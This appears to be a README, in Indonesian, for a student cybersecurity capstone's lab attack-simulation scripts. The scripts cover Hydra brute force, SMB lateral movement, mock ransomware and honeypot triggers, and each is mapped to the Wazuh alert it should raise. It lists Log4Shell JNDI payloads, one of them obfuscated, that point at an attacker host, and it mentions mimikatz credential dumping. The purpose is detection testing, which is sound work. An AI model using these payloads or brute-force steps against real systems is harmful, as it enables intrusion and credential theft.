# Simulation Scripts — Project Sentinel
**SIEMsalabim capstone kelar · FYEP Cybersecurity 2026**

> ⚠️ **PERINGATAN:** Semua script di folder ini hanya boleh dijalankan di lingkungan lab terisolasi Project Sentinel. Dilarang keras menjalankan script ini di jaringan publik atau sistem yang bukan milik tim.

---

## Daftar Script

| Script | Platform | Fungsi | MITRE |
|---|---|---|---|
| `attack_simulation.sh` | Kali Linux | Master script simulasi serangan | T1046, T1110, T1021, T1083 |
| `log4shell_sim.sh` | Kali Linux | Simulasi eksploitasi Log4Shell | T1190 |
| `nmap-scan.sh` | Wazuh Manager | Asset discovery otomatis | T1046 |
| `ransomware_sim.ps1` | Windows Endpoint | Simulasi ransomware behavior | T1486 |
| `rdp_bruteforce_sim.ps1` | Windows Endpoint | Simulasi brute force RDP | T1110 |

---

## 1. attack_simulation.sh

**Platform:** Kali Linux  
**Lokasi:** `~/Documents/fyep/attack_simulation.sh`  
**Referensi kasus:** Colonial Pipeline 2021, MGM Resorts 2023

### Deskripsi
Master script yang mengintegrasikan 7 mode simulasi serangan dalam satu file. Dirancang untuk dijalankan berulang kali dengan parameter berbeda sesuai kebutuhan demo atau validasi sistem.

### Cara penggunaan

```bash
# Lihat semua opsi
bash attack_simulation.sh --help

# Mode individual
bash attack_simulation.sh --mode recon       # Network reconnaissance
bash attack_simulation.sh --mode ssh         # Brute force SSH (light)
bash attack_simulation.sh --mode ssh --intensity full  # Brute force SSH (rockyou)
bash attack_simulation.sh --mode rdp         # Brute force RDP
bash attack_simulation.sh --mode honeypot    # Trigger Cowrie honeypot
bash attack_simulation.sh --mode canary      # Akses canary token
bash attack_simulation.sh --mode lateral     # Lateral movement SMB/WMI
bash attack_simulation.sh --mode ransomware  # Ransomware trigger via SSH

# Semua simulasi berurutan
bash attack_simulation.sh --mode all
```

### Mode yang tersedia

| Mode | Tool | Target | Alert Wazuh |
|---|---|---|---|
| `recon` | Nmap | 192.168.10.0/24 | rule 100600-604 |
| `ssh` | Hydra | 192.168.10.30 | rule 5710, 100012 |
| `rdp` | Hydra | 192.168.10.20 | rule 100003, 100004 |
| `honeypot` | sshpass + ssh | 100.69.237.58 | rule 100100-104 |
| `canary` | ssh + cat | 192.168.10.30 | rule 100200, 100301 |
| `lateral` | Nmap + Hydra SMB | 192.168.10.20 | rule 100004 |
| `ransomware` | ssh + bash | 192.168.10.30 | FIM syscheck |

### Konfigurasi target (sesuaikan jika IP berubah)

```bash
TARGET_SSH="192.168.10.30"       # Linux Endpoint
TARGET_RDP="192.168.10.20"       # Windows Endpoint
TARGET_HONEYPOT="100.69.237.58"  # Honeypot via Tailscale
```

### Output
Semua log dan evidence disimpan otomatis di:
```
/tmp/sentinel_evidence/[TIMESTAMP]/
├── hydra_ssh_result.txt
├── hydra_ssh_verbose.txt
├── hydra_rdp_result.txt
├── nmap_recon.txt
├── lateral_movement.txt
├── ransomware_trigger.txt
├── canary_trigger.txt
├── honeypot_trigger.txt
└── SIMULATION_REPORT.md
```

### Prasyarat
```bash
sudo apt install hydra nmap sshpass netcat-openbsd -y
```

---

## 2. log4shell_sim.sh

**Platform:** Kali Linux  
**Lokasi:** `~/Documents/fyep/log4shell_sim.sh`  
**CVE:** CVE-2021-44228  
**Referensi:** https://github.com/advisories/GHSA-jfh8-c2jp-5v3q

### Deskripsi
Mengirimkan HTTP request berisi payload JNDI ke web server Nginx di Linux Endpoint untuk mensimulasikan eksploitasi Log4Shell. Script mengirim 5 variasi payload untuk trigger rule Wazuh 100800-100803.

### Cara penggunaan

```bash
# Default — target Linux Endpoint, attacker IP Kali
bash log4shell_sim.sh

# Dengan parameter custom
bash log4shell_sim.sh [TARGET_IP] [ATTACKER_IP]
bash log4shell_sim.sh 192.168.10.30 100.82.107.52
```

### Payload yang dikirim

| # | Payload | Header | Protocol |
|---|---|---|---|
| 1 | `${jndi:ldap://ATTACKER/exploit}` | X-Api-Version | LDAP |
| 2 | `${jndi:ldap://ATTACKER/a}` | User-Agent | LDAP |
| 3 | `${jndi:rmi://ATTACKER:1099/exploit}` | X-Api-Version | RMI |
| 4 | `${jndi:dns://ATTACKER/exploit}` | X-Api-Version | DNS |
| 5 | `${j${::-n}di:ldap://ATTACKER/exploit}` | X-Api-Version | Obfuscated |

### Alert Wazuh yang diharapkan

```
rule 100800 — Log4Shell JNDI payload detected         → level 13
rule 100801 — Log4Shell protocol variant               → level 13
rule 100802 — Multiple JNDI attempts (setelah 3 req)  → level 15
```

### Prasyarat
```bash
# Nginx harus berjalan di Linux Endpoint
ssh fyep-1@192.168.10.30 "sudo systemctl status nginx"
```

### Evidence
```
/tmp/sentinel_evidence/log4shell/[TIMESTAMP]/
└── log4shell.txt   ← output curl lengkap semua payload
```

---

## 3. nmap-scan.sh

**Platform:** Wazuh Manager (192.168.20.10)  
**Lokasi:** `/opt/asset-discovery/nmap-scan.sh`  
**Dijadwalkan:** Setiap hari pukul 02:00 via cron job

### Deskripsi
Script asset discovery otomatis yang menscan seluruh subnet VLAN10, VLAN20, dan VLAN30 setiap hari. Output XML di-parse oleh `parse-assets.py` dan dikirim ke Wazuh sebagai log untuk deteksi rogue device.

### Cara penggunaan

```bash
# Jalankan manual (untuk demo atau test)
sudo bash /opt/asset-discovery/nmap-scan.sh

# Lihat hasil scan terakhir
cat /var/log/asset-discovery/asset-discovery.log | python3 -m json.tool | tail -20

# Lihat cron job yang terdaftar
sudo crontab -l | grep asset
```

### Subnet yang di-scan

```
192.168.10.0/24  → VLAN10 Production
192.168.20.0/24  → VLAN20 Management
192.168.30.0/24  → VLAN30 DMZ
```

### Alur kerja

```
nmap-scan.sh
    ↓ output XML → /var/lib/asset-discovery/scan_vlan*.xml
parse-assets.py
    ↓ parse XML → bandingkan dengan KNOWN_ASSETS whitelist
/var/log/asset-discovery/asset-discovery.log
    ↓ Wazuh baca via localfile
rule 100600-604 → alert di dashboard
```

### Alert Wazuh yang diharapkan

```
rule 100600 — New unrecognized host detected  → level 8
rule 100601 — Known host offline              → level 5
rule 100602 — Host returned online            → level 5
rule 100603 — Scan summary                   → level 5
rule 100604 — Rogue device VLAN10 CRITICAL   → level 12
```

### KNOWN_ASSETS whitelist
Host berikut sudah terdaftar dan tidak akan trigger alert:
```
192.168.10.1  → VMware Host VMnet2
192.168.10.2  → pfSense Firewall
192.168.10.20 → Windows Endpoint
192.168.10.30 → Linux Endpoint
192.168.20.10 → Wazuh SIEM
192.168.30.10 → Honeypot
```
Host di luar daftar ini akan trigger alert **ROGUE DEVICE**.

### File output
```
/var/lib/asset-discovery/
├── scan_vlan10_[TIMESTAMP].xml    ← raw Nmap output VLAN10
├── scan_vlan20_[TIMESTAMP].xml    ← raw Nmap output VLAN20
├── scan_vlan30_[TIMESTAMP].xml    ← raw Nmap output VLAN30
└── known_hosts.json               ← daftar host dari scan sebelumnya

/var/log/asset-discovery/
├── asset-discovery.log            ← log JSON yang dibaca Wazuh
├── scan.log                       ← log proses scan
└── cron.log                       ← log cron job harian
```

---

## 4. ransomware_sim.ps1

**Platform:** Windows Endpoint (192.168.10.20)  
**Lokasi:** `C:\Users\fyep-2\Desktop\ransomware_sim.ps1`  
**Referensi kasus:** Caesars Entertainment 2023, MGM Resorts 2023

### Deskripsi
Mensimulasikan perilaku ransomware dengan membuat 60 file di direktori target lalu mengenkripsinya sekaligus (rename ke ekstensi `.sentinel_locked`). Dirancang untuk trigger Wazuh FIM realtime alert tanpa merusak file sistem asli.

### Cara penggunaan

```powershell
# Simulasi lengkap (buat file + enkripsi)
powershell -ExecutionPolicy Bypass -File ransomware_sim.ps1

# Dengan jumlah file lebih banyak
powershell -ExecutionPolicy Bypass -File ransomware_sim.ps1 -FileCount 100

# Buat file saja (tanpa enkripsi)
powershell -ExecutionPolicy Bypass -File ransomware_sim.ps1 -Mode create

# Enkripsi saja (file sudah ada)
powershell -ExecutionPolicy Bypass -File ransomware_sim.ps1 -Mode encrypt

# Restore semua file yang dienkripsi
powershell -ExecutionPolicy Bypass -File ransomware_sim.ps1 -Mode restore

# Hapus semua file simulasi
powershell -ExecutionPolicy Bypass -File ransomware_sim.ps1 -Mode cleanup
```

### Direktori target
```
C:\Users\fyep-2\Documents\gtcorp_files\
├── Documents\   → report_1.docx ... report_12.docx
├── Database\    → record_1.sql  ... record_12.sql
├── Finance\     → ledger_1.xlsx ... ledger_12.xlsx
├── HR\          → employee_1.txt... employee_12.txt
└── Backup\      → backup_1.bak  ... backup_12.bak
```

### Alur simulasi

```
1. Buat 60 file di gtcorp_files\ (FIM deteksi: file added)
2. Tunggu 15 detik → Wazuh FIM scan file baru
3. Enkripsi massal → rename semua ke .sentinel_locked
4. Buat README_DECRYPT.txt (ransom note)
   (FIM deteksi: mass file modified + .locked extension)
5. Wazuh alert: rule 100700, 100701, 100702
```

### Alert Wazuh yang diharapkan

```
rule 100700 — RANSOMWARE DETECTED - .locked extension  → level 12
rule 100701 — RANSOMWARE CRITICAL - mass encryption    → level 15
rule 100702 — Ransom note README_DECRYPT.txt created   → level 14
```

### Prasyarat
- Wazuh agent aktif dan FIM dikonfigurasi untuk `C:\Users\fyep-2\Documents\gtcorp_files`
- Pastikan di ossec.conf Windows ada:
```xml
<directories realtime="yes" report_changes="yes" check_all="yes">
  C:\Users\fyep-2\Documents\gtcorp_files
</directories>
```

### Evidence output
```
C:\Users\fyep-2\Desktop\evidence\ransomware_[TIMESTAMP]\
├── files_before_encryption.txt
├── files_after_encryption.txt
└── REPORT.md
```

> ✅ **Aman:** script tidak mengenkripsi file sistem. Semua operasi hanya di direktori `gtcorp_files`. File bisa di-restore dengan `-Mode restore`.

---

## 5. rdp_bruteforce_sim.ps1

**Platform:** Windows Endpoint (192.168.10.20)  
**Lokasi:** `C:\Users\fyep-2\Desktop\rdp_bruteforce_sim.ps1`

### Deskripsi
Mensimulasikan brute force RDP dengan mencoba 15 kombinasi credential yang salah secara lokal di Windows Endpoint. Menggunakan `DirectoryServices.AccountManagement` untuk generate Windows Event ID 4625 (authentication failure) yang akan dideteksi Wazuh.

Dibuat sebagai alternatif Hydra RDP karena traffic RDP dari Kali diblokir pfSense micro-segmentation.

### Cara penggunaan

```powershell
# Jalankan langsung
powershell -ExecutionPolicy Bypass -File rdp_bruteforce_sim.ps1
```

### Output yang diharapkan

```
Simulasi RDP Brute Force - Project Sentinel
Target: 192.168.10.20 (Windows Endpoint)
Generating 15 failed authentication attempts...

[1/15]  Attempt: administrator / wrongpass1 → Failed
[2/15]  Attempt: admin / wrongpass2 → Failed
[3/15]  Attempt: root / wrongpass3 → Failed
...
[15/15] Attempt: sysadmin / test123 → Failed

Selesai: 15 authentication attempts
Cek Wazuh Dashboard: rule.id: 100004
```

### Alert Wazuh yang diharapkan

```
rule 100003 — Windows: Failed Authentication (per attempt) → level 5
rule 100004 — Multiple Failed Logins Brute Force           → level 11
              (fired setelah 10x dalam 120 detik)
```

### Kenapa tidak pakai Hydra langsung ke port 3389?

```
Kali Linux → Tailscale → pfSense → VLAN10
                                      ↓
                          port 3389 DIBLOKIR pfSense
                          (micro-segmentation rule)
```

Script ini dijalankan dari **dalam** Windows Endpoint untuk bypass pembatasan tersebut, karena Windows mencatat authentication failure lokal sebagai Event ID 4625 yang diteruskan ke Wazuh.

---

## Topologi Target

```
┌─────────────────────────────────────────────────────┐
│  Kali Linux (100.82.107.52)  ← attack_simulation.sh │
│              └─ via Tailscale                        │
└──────────────────┬──────────────────────────────────┘
                   │
            ┌──────▼──────┐
            │   pfSense   │  192.168.10.2
            └──┬──┬──┬────┘
               │  │  │
    VLAN10 ────┘  │  └──── VLAN30
    192.168.10.x  │         192.168.30.x
    ┌───────────┐ │  ┌─────────────────┐
    │ fyep-1    │ │  │ Honeypot Cowrie │
    │ .10.30    │ │  │ .30.10          │
    ├───────────┤ │  └─────────────────┘
    │ Windows   │ │
    │ .10.20    │ └──── VLAN20
    └───────────┘        192.168.20.x
                   ┌─────────────────┐
                   │ Wazuh SIEM      │
                   │ .20.10          │
                   └─────────────────┘
```

---

## Urutan Demo yang Disarankan

```
1. nmap-scan.sh          → Reconnaissance + Asset Discovery
2. attack_simulation.sh --mode ssh      → Brute Force SSH
3. rdp_bruteforce_sim.ps1               → Brute Force RDP
4. attack_simulation.sh --mode honeypot → Honeypot Trigger
5. attack_simulation.sh --mode canary   → Canary Token Linux
6. [manual] notepad credentials.xlsx   → Canary Token Windows
7. [manual] mimikatz.exe               → Credential Dump
8. [manual] nc -zvw test               → Lateral Movement
9. ransomware_sim.ps1                  → Ransomware FIM
10. log4shell_sim.sh                   → Log4Shell CVE-2021-44228
```

---

*Project Sentinel · SIEMsalabim capstone kelar · FYEP Cybersecurity 2026*  
*Repo: https://github.com/Capstone-FYEP-15/15-fyep2026*
